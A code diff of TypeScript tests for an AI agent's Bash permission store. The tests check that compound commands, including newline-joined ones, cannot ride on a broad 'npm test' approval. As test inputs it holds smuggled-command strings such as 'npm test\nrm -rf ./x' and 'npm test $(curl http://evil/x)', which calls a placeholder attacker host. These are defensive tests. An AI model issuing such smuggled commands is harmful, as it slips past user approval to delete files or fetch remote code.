@@ -3,6 +3,7 @@ import { mkdtempSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { getRuntimeCoreSessionDir } from "../runtime-core/session-store";
+import { buildPermissionFingerprint } from "../permissions/permission-rules";
 import { createFileBackedLumeInterruptionStore } from "./interruption-store";
 import { createFileBackedRunContinuationStore } from "../runtime-core/run-continuation-store";
 import { runtimePermissionSessionStore } from "../permissions/permission-session";
@@ -25,6 +26,10 @@ describe("tool-permission-session", () => {
     runtimePermissionSessionStore.clear("s-scope-compound");
     runtimePermissionSessionStore.clear("s-scope-simple2");
     runtimePermissionSessionStore.clear("s-scope-match");
+    runtimePermissionSessionStore.clear("s-scope-nl");
+    runtimePermissionSessionStore.clear("s-scope-nl2");
+    runtimePermissionSessionStore.clear("s-scope-degrade");
+    runtimePermissionSessionStore.clear("s-scope-keep");
     runtimePermissionSessionStore.clear("s-scope-submit");
     runtimePermissionSessionStore.clear("parent-session");
     runtimePermissionSessionStore.clear("child-session");
@@ -55,7 +60,7 @@ describe("tool-permission-session", () => {
       requestId: "req-1",
       decision: "allow_once"
     });
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     const decision = await waitPromise;
     expect(decision).toBe("allow_once");
   });
@@ -131,7 +136,7 @@ describe("tool-permission-session", () => {
       requestId: "req-io-failure",
       decision: "allow_once"
     });
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     const decision = await Promise.race([
       waitPromise,
       new Promise<never>((_, reject) => {
@@ -199,6 +204,78 @@ describe("tool-permission-session", () => {
     expect(runtimePermissionSessionStore.isFingerprintGranted("s-scope-match", "bash:npm test $(curl http://evil/x)")).toBeFalse();
     // 纯参数后缀仍按 command 档语义放行
     expect(runtimePermissionSessionStore.isFingerprintGranted("s-scope-match", "bash:npm test -- --watch")).toBeTrue();
+  });
+
+  test("#558 三轮 review P1(换行折叠):\\n 分隔的复合命令经归一化带分号,不再伪装参数", () => {
+    // 变异基线:normalizeWhitespace 回退为全折叠空白,本用例即红——
+    // 请求指纹变回「npm test rm -rf ./x」无分号,词边界+连接符双层落空
+    markToolFingerprintAllowed("s-scope-nl", "bash:npm test", "command");
+    const fp = buildPermissionFingerprint({
+      descriptor: { canonicalName: "bash" } as never,
+      rawInput: { command: "npm test\nrm -rf ./x" },
+    });
+    expect(fp).toBe("bash:npm test; rm -rf ./x");
+    expect(runtimePermissionSessionStore.isFingerprintGranted("s-scope-nl", fp)).toBeFalse();
+    // 写入侧同理:含换行的命令归一化后带分号,拿不到 command 档
+    markToolFingerprintAllowed("s-scope-nl2", "bash:npm test\nrm -rf ./x", "command");
+    expect(
+      runtimePermissionSessionStore.isFingerprintGranted("s-scope-nl2", "bash:npm test; rm -rf ./x --no-save")
+    ).toBeFalse();
+  });
+
+  test("#558 二轮 review P1(effectiveScope 回执):降级 exact 经 submit 带出(UI F6)", async () => {
+    const controller = new AbortController();
+    const waitPromise = waitForToolPermissionDecision(
+      {
+        threadId: "s-scope-degrade",
+        requestId: "req-scope-degrade",
+        toolUseId: "tool-scope-degrade",
+        toolName: "Bash",
+        risk: "high",
+        reason: "需要确认",
+        grantSuggestion: { fingerprint: "bash:npm install && npm test", label: "允许相同 Bash 调用" },
+        input: { command: "npm install && npm test" }
+      },
+      controller.signal,
+      () => {}
+    );
+    const result = submitToolPermissionDecision({
+      threadId: "s-scope-degrade",
+      requestId: "req-scope-degrade",
+      decision: "allow_always",
+      allowAlwaysScope: "command"
+    });
+    await waitPromise;
+    // 复合命令被否决宽档:handled 照常 true,但生效档如实降级
+    expect(result.handled).toBe(true);
+    expect(result.effectiveScope).toBe("exact");
+    runtimePermissionSessionStore.clear("s-scope-degrade");
+
+    // 对照:simple 命令同通路生效档保持 command
+    const controller2 = new AbortController();
+    const waitPromise2 = waitForToolPermissionDecision(
+      {
+        threadId: "s-scope-keep",
+        requestId: "req-scope-keep",
+        toolUseId: "tool-scope-keep",
+        toolName: "Bash",
+        risk: "high",
+        reason: "需要确认",
+        grantSuggestion: { fingerprint: "bash:npm run build", label: "允许相同 Bash 调用" },
+        input: { command: "npm run build" }
+      },
+      controller2.signal,
+      () => {}
+    );
+    const result2 = submitToolPermissionDecision({
+      threadId: "s-scope-keep",
+      requestId: "req-scope-keep",
+      decision: "allow_always",
+      allowAlwaysScope: "command"
+    });
+    await waitPromise2;
+    expect(result2.handled).toBe(true);
+    expect(result2.effectiveScope).toBe("command");
   });
 
   test("#558 二轮 review P1(submit 通路):决策入口携带 scope 必须写入宽指纹", async () => {
@@ -307,7 +384,7 @@ describe("tool-permission-session", () => {
       requestId: "req-proxy",
       decision: "allow_once"
     });
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     const decision = await waitPromise;
     expect(decision).toBe("allow_once");
   });
@@ -335,7 +412,7 @@ describe("tool-permission-session", () => {
       threadPermissionMode: "bypassPermissions"
     });
 
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     expect(runtimePermissionSessionStore.isBypassed("parent-session")).toBeTrue();
     expect(runtimePermissionSessionStore.isBypassed("child-session")).toBeTrue();
     expect(await waitPromise).toBe("allow_once");
@@ -529,7 +606,7 @@ describe("tool-permission-session", () => {
       decision: "deny"
     });
 
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     expect((await store.get("tool_approval:automation-cold-req"))?.status).toBe("rejected");
   });
 
@@ -567,7 +644,7 @@ describe("tool-permission-session", () => {
       decision: "deny"
     });
 
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     expect((await store.get("tool_approval:cold-req"))?.status).toBe("rejected");
   });
 
@@ -628,7 +705,7 @@ describe("tool-permission-session", () => {
       decision: "allow_always"
     });
 
-    expect(handled).toBeTrue();
+    expect(handled.handled).toBeTrue();
     await new Promise((resolve) => setTimeout(resolve, 0));
     expect(runtimePermissionSessionStore.isFingerprintGranted(threadId, "bash:git status")).toBeTrue();
     expect(await continuationStore.get(runId)).toMatchObject({
